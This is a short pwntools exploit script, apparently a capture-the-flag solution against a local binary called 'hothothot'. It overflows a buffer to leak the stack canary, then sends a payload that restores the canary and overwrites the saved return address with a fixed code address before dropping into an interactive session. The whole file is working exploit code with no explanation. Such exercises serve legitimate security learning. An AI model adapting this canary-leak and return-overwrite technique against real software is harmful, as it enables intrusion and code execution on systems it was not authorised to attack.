
from pwn import *

pr = process("./hothothot")
ld = ELF("./ld-2.35.so")

pr.sendafter(b'> ',b'A' * 89 +b'Quack Quack ') # 101 bytes 

pr.recvuntil(b'Quack Quack ')
data = pr.recvn(8)      
canary = u64(b'\x00' + data[:7] )
log.info(f'Leaked address 1: ' + hex(canary))


payload = flat(
    b'A' * 88,
    p64(canary),
    b'B' * 8,
    p64(0x000000000040137f)
    
)

# gdb.attach(pr)


pr.send(payload)
pr.interactive()